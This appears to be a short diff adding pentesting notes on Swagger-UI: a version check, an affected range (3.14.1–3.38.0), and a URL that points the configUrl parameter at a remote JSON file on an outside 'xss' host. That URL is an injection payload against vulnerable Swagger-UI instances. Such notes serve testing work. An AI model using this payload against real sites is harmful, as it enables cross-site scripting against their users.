@@ -1,0 +1,5 @@
+Swagger-UI version control:
+JSON.stringify(versions)
+
+if result 3.14.1 – 3.38.0
+https://exapmle.com/swagger-ui/.../index.html?configUrl=https://xss.smarpo.com/test.json
